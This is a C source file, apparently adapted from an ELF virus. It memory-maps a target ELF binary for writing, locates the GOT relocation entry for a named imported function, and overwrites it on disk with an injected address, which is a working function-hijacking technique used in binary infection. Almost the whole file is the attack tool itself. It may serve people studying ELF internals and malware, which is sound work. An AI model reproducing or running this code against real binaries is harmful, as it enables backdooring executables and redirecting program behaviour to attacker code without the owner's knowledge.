/* compile gcc -o hijack2 hijack2.c
 * code from ElfMaster virus.c
 * https://github.com/elfmaster/skeksi_virus/blob/master/virus.c
 *
 * Usage ./hijack2 .zyx.tmp.bin puts <vaddr from ./lelf2 output>
 * get relocated file from ./lelf2 hello eputs.o
 */



#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>


typedef struct elfbin {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Dyn *dyn;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	Elf64_Off dataOff;
	Elf64_Off textOff;
	uint8_t *mem;
	size_t size;
	int mode;
	char *path;
	struct stat st;
	int fd;
	int original_virus_exe;
} elfbin_t;

/* load target writable */
int load_target(const char *path, elfbin_t *elf)
{
	int i;
	struct stat st;
	elf->path = (char *)path;
	int fd;
	fd = open(path, O_RDWR);
	if (fd < 0)
		return -1;
	elf->fd = fd;
	if (fstat(fd, &st) < 0)
		return -1;
	elf->mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (elf->mem == MAP_FAILED)
		return -1;
	elf->ehdr = (Elf64_Ehdr *)elf->mem;
	// address at program header offset 
	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
	// address at section header offset
	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
	for (i = 0;i < elf->ehdr->e_phnum; i++) {

		switch(elf->phdr[i].p_type) {
			case PT_LOAD:
				switch(!!elf->phdr[i].p_offset) {
					case 0:
						elf->textVaddr = elf->phdr[i].p_vaddr;
						elf->textSize = elf->phdr[i].p_memsz;
						break;
					case 1:
						elf->dataVaddr = elf->phdr[i].p_vaddr;
						elf->dataSize = elf->phdr[i].p_memsz;
						elf->dataOff = elf->phdr[i].p_offset;
						break;
				}
				break;
			case PT_DYNAMIC:
				elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
				break;
		}
	}
	elf->st = st;
	elf->size = st.st_size;
	elf->mode = st.st_mode;
	return 0;
}
int hijack_function(elfbin_t *target, Elf64_Addr new_vaddr, char *name)
{
	int i, j = 0, symindex = -1;
	Elf64_Sym *symtab;
	Elf64_Rela *jmprel;
	Elf64_Dyn *dyn = target->dyn;
	Elf64_Addr *gotentry, *pltgot;

	char *strtab;
	size_t strtab_size;
	size_t jmprel_size;
	Elf64_Addr gotaddr = 0;
	Elf64_Off gotoff = 0;

	for (i = 0;dyn[i].d_tag != DT_NULL; i++) {
		switch(dyn[i].d_tag) {
			case DT_SYMTAB: //relative to the text segment base
				symtab = (Elf64_Sym *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				printf("[+] symtab: 0x%08x\n", symtab);
				break;
			case DT_PLTGOT: // relative to the data segment base
				pltgot = (long *)&target->mem[target->dataOff + (dyn[i].d_un.d_ptr - target->dataVaddr)];
				printf("[+] pltgot: 0x%08x\n", pltgot);
				break;
			case DT_STRTAB: // relative to the text segment base
				strtab = (char *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				printf("[+] strtab: 0x%08x\n", strtab);
				break;
			case DT_STRSZ:
				strtab_size = (size_t)dyn[i].d_un.d_val;
				break;
			case DT_JMPREL:
				jmprel = (Elf64_Rela *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
				break;
			case DT_PLTRELSZ:
				jmprel_size = (size_t)dyn[i].d_un.d_val;
				break;

		}
	}
	if (symtab == NULL || pltgot == NULL)
	{
		printf("[-] Unable to locate symtab or pltgot\n");
		return -1;
	}

	for (i = 0; symtab[i].st_name <= strtab_size; i++)
	{
		if (!strcmp(&strtab[symtab[i].st_name], name))
		{
			printf("[+] %s symbol index: %d\n", name, i);
			symindex = i;
			break;
		}
	}
	if (symindex == -1)
	{
		printf("[-] cannot find %s\n", name);
		return -1;
	}

	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++)
	{
		if (!strcmp(&strtab[symtab[ELF64_R_SYM(jmprel->r_info)].st_name], name))
		{
			gotaddr = jmprel->r_offset;
			gotoff = target->dataOff + (jmprel->r_offset - target->dataVaddr);
			printf("[+] gotaddr: 0x%08x gotoff: 0x%08x\n", gotaddr, gotoff);
			break;
		}
	}

	if (gotaddr == 0)
	{
		printf("[-] Couldn't find relocation entry for %s\n", name);
		return -1;
	}

	gotentry = (Elf64_Addr *)&target->mem[gotoff];
	*gotentry = new_vaddr;

	printf("[+] patched GOT entry 0x%08x with address 0x%08x\n", gotaddr, new_vaddr);

	return 0;

}


int main(int argc, char **argv)
{
	if (argc < 4)
	{
		printf("Usage: %s <file> <function> <inject addr>\n", argv[0]);
		return -1;
	}

	elfbin_t target;
	if (load_target(argv[1], &target) == -1)
	{
		printf("[-] Could not load target. Exiting...\n");
		return -1;
	}

	unsigned long addr;
	char *endptr;
	errno = 0;
	addr = strtoul(argv[3], &endptr, 16);
	if (errno == EINVAL)
	{
		printf("[-] Bad function address. Exiting... \n");
		return -1;
	}

	if (hijack_function(&target, addr, argv[2]) == -1)
	{
		printf("[-] Hijack unsuccessful!\n");
		return -1;
	}

	printf("[+} Success!\n");
	munmap(target.mem, target.size);
	return 0;
}


